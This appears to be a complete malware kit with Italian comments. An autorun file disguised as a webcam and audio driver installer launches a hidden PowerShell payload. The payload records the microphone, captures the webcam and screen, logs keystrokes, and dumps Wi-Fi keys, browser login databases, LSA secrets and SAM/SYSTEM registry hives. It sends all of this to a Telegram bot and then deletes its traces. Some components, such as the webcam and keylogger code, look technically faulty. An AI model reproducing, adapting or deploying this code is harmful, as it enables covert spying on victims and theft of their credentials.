[AutoRun]
open=launcher.bat
action=Installa driver Webcam & Audio
icon=icon.ico
shell\open=Apri cartella
shell\open\command=explorer.exe .
shell\install=Installa driver
shell\install\command=launcher.bat
shell=install


@echo off
:: Esegui in RAM
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$s = (Get-Content '%~dp0ghost.ps1' -Raw); IEX $s"

:: Espelli dopo 5 minuti
timeout /t 300 >nul
powershell -c "$v=Get-Volume | ? {$_.DriveLetter -eq '%~d0'.Substring(0,1)}; if($v){$v|%{$_.DriveLetter}|Eject}" >nul 2>&1

exit


# === USB GHOST DUMP v7.0 - MICROFONO + WEBCAM + KEYLOGGER + EXFIL ===
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -AssemblyName System.Windows.Forms, System.Drawing, System.Drawing.Imaging

$hostName = $env:COMPUTERNAME -replace '[^\w]','_'
$date = Get-Date -Format "yyyyMMdd_HHmm"
$ramDir = "$env:TEMP\ghost_$([guid]::NewGuid())"
$zipFile = "$ramDir\$hostName`_$date.zip"

New-Item -ItemType Directory -Path $ramDir -Force | Out-Null

# === TELEGRAM (SOSTITUISCI!) ===
$TG_TOKEN = "123456789:AAF..."     # ← IL TUO BOT TOKEN
$TG_CHAT  = "-1001234567890"       # ← IL TUO GRUPPO

function Send-File($path) {
    if(Test-Path $path) {
        $url = "https://api.telegram.org/bot$TG_TOKEN/sendDocument"
        Invoke-RestMethod -Uri $url -Method Post -Form @{chat_id=$TG_CHAT; document=Get-Item $path} -ErrorAction SilentlyContinue
    }
}

# === 1. MICROFONO (10 sec ogni 60 sec) ===
function Record-Audio {
    try {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Audio {
    [DllImport("winmm.dll")] public static extern int mciSendString(string command, string returnString, int returnLength, IntPtr callback);
}
'@
        $file = "$ramDir\mic_$(Get-Date -f 'HHmmss').wav"
        [Audio]::mciSendString("open new Type waveaudio Alias recsound", $null, 0, [IntPtr]::Zero)
        [Audio]::mciSendString("record recsound", $null, 0, [IntPtr]::Zero)
        Start-Sleep -Seconds 10
        [Audio]::mciSendString("save recsound `"$file`"", $null, 0, [IntPtr]::Zero)
        [Audio]::mciSendString("close recsound", $null, 0, [IntPtr]::Zero)
        return $file
    } catch { return $null }
}

# === 2. WEBCAM ===
function Take-Webcam {
    try {
        $devices = Get-CimInstance Win32_PnPEntity | ? {$_.Name -like '*camera*' -or $_.Name -like '*webcam*'}
        if(!$devices) { return $null }
        $cap = New-Object -ComObject WMPlayer.OCX
        $cap.URL = "dummy"
        $cap.controls.stop()
        $file = "$ramDir\webcam_$(Get-Date -f 'HHmmss').jpg"
        $cap.settings.volume = 0
        $cap.openPlayer("vfw://0")
        Start-Sleep -Seconds 2
        $cap.controls.currentPosition = 0
        $cap.controls.pause()
        $cap.currentPlaylist.items[0].getItemInfo("SourceURL")
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.SendKeys]::SendWait("{PRTSC}")
        $bmp = [System.Windows.Forms.Clipboard]::GetImage()
        if($bmp) { $bmp.Save($file, [System.Drawing.Imaging.ImageFormat]::Jpeg); $bmp.Dispose() }
        return $file
    } catch { return $null }
}

# === 3. SCREENSHOT ===
function Take-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0, 0, 0, 0, $bounds.Size)
    $file = "$ramDir\scr_$(Get-Date -f 'HHmmss').png"
    $bmp.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
    $g.Dispose(); $bmp.Dispose()
    return $file
}

# === 4. KEYLOGGER ===
$logFile = "$ramDir\keys.txt"
$global:keys = ""
$hook = {
    param($w, $m)
    if($m -ge 0x100 -and $m -le 0x103) {
        $k = [System.Windows.Forms.Keys]$m
        if($k -ne 'None') {
            $global:keys += "$k "
            if($global:keys.Length -gt 100) {
                $global:keys | Out-File $logFile -Append -Encoding UTF8
                $global:keys = ""
            }
        }
    }
}
$null = [System.Windows.Forms.Application]::AddMessageFilter((New-Object -TypeName System.Windows.Forms.IMessageFilter -Property @{PreFilterMessage={&$hook $args[0] $args[1]}}))

# === 5. TIMER: TUTTO OGNI 60 SEC ===
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 60000
$timer.Add_Tick({
    # Microfono
    $mic = Record-Audio
    if($mic) { Send-File $mic; Remove-Item $mic -Force }

    # Webcam
    $web = Take-Webcam
    if($web) { Send-File $web; Remove-Item $web -Force }

    # Screenshot
    $scr = Take-Screenshot
    Send-File $scr
    Remove-Item $scr -Force
})
$timer.Start()

# === 6. DUMP CREDENZIALI ===
# Wi-Fi
netsh wlan show profiles | Select-String "\:(.+)$" | %{
    $n = $_.Matches.Groups[1].Value.Trim()
    $k = (netsh wlan show profile name="$n" key=clear) | Select-String "Contenuto chiave|Key Content" | %{$_.ToString().Split(':')[-1].Trim()}
    "$n : $k" | Out-File "$ramDir\wifi.txt" -Append -Encoding UTF8
}

# Browser
@('Chrome','Edge') | %{
    $p = if($_ -eq 'Chrome') { "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" } else { "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" }
    if(Test-Path $p) { Copy-Item $p "$ramDir\$_.db" -Force }
}

# LSA + SAM
try {
    $src = "using System; using System.Runtime.InteropServices; public class L { [DllImport(""advapi32.dll"")] public static extern uint LsaRetrievePrivateData(IntPtr p, ref LS u, out IntPtr d); [DllImport(""advapi32.dll"")] public static extern uint LsaOpenPolicy(ref long s, ref int o, int a, out IntPtr h); [DllImport(""advapi32.dll"")] public static extern uint LsaClose(IntPtr h); [StructLayout(LayoutKind.Sequential)] public struct LS { public ushort L; public ushort M; public IntPtr B; } public static string G(string k) { IntPtr h; long s=0; int o=0; LS u = new LS(); u.B = Marshal.StringToHGlobalUni(k); u.L = (ushort)(k.Length*2); u.M = u.L; if (LsaOpenPolicy(ref s, ref o, 0x80000000, out h) != 0) return null; IntPtr d; if (LsaRetrievePrivateData(h, ref u, out d) != 0) { LsaClose(h); return null; } int l = Marshal.ReadInt32(d, -4); string r = Marshal.PtrToStringUni(d, l/2); LsaClose(h); return r; } }"
    Add-Type $src
    @('DefaultPassword','NL$KM') | %{ $v=[L]::G($_); if($v){ "$_ : $v" | Out-File "$ramDir\lsa.txt" -Append -Encoding UTF8 }}
} catch {}

if([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544') {
    'SAM','SYSTEM' | %{ reg save "HKLM\$_" "$ramDir\$_" >$null 2>&1 }
}

# === 7. INVIO PARZIALE ===
Get-ChildItem $ramDir -File | ?{$_.Name -notmatch 'scr_|mic_|webcam_|zip'} | %{ Send-File $_.FullName }

# === 8. ZIP FINALE (dopo 4 min) ===
Start-Sleep -Seconds 240
if($global:keys) { $global:keys | Out-File $logFile -Append }
Get-ChildItem $ramDir -File | Compress-Archive -DestinationPath $zipFile -Force
Send-File $zipFile

# === 9. PULIZIA ===
Start-Sleep -Seconds 10
Remove-Item $ramDir -Recurse -Force -ErrorAction SilentlyContinue


